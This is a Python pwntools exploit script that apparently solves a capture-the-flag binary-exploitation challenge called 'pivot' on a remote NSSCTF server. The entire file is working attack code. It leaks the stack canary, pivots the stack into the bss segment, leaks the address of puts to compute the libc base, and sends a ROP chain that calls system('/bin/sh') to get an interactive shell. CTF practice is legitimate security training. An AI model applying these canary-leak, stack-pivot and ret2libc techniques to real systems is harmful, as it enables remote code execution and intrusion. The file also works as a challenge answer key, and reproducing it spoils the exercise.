from pwn import *
import time

context.log_level = "debug"

# io = process("./pivot")
io = remote("node5.anna.nssctf.cn", 21277)
elf = ELF("./pivot")
libc = ELF("./libc.so.6")

start = 0x4010D0
ret = 0x40101A
bss = 0x404080 + 0x900
read_text = 0x4011D4
pop_rdi_ret = 0x401343
leave_ret = 0x401213
vuln = 0x4011B6
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

io.recvuntil(b"Name:")
io.sendline(b"a" * (0x30 - 0x8))
io.recvuntil(b"aaaaaa\n")
canary = u64(io.recv(8)[:7].rjust(8, b"\x00"))
print(hex(canary))

time.sleep(0.1)
# 栈迁移
io.send(b"a" * (0x110 - 0x8) + p64(canary) + p64(bss) + p64(read_text))

payload = p64(0) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)
payload = payload.ljust(0x108, b"a") + p64(canary) + p64(bss - 0x110) + p64(leave_ret)
io.send(payload)
puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc_base = puts_addr - libc.sym["puts"]
print("puts address =", hex(puts_addr))
print("libc base address =", hex(libc_base))
# gdb.attach(io)
# one_gadget = 0x50A37 + libc_base
# payload = 0x108 * b"a" + p64(canary)  +p64(0) + p64(one_gadget)
# io.send(payload)

# gdb.attach(io)
system = libc.sym["system"] + libc_base
binsh = next(libc.search(b"/bin/sh")) + libc_base
payload = p64(ret) * 0 + p64(pop_rdi_ret) + p64(binsh) + p64(system)
payload = payload.ljust(0x108, b"b") + p64(canary) + p64(bss - 0x208) + p64(leave_ret)
io.send(payload)

io.interactive()
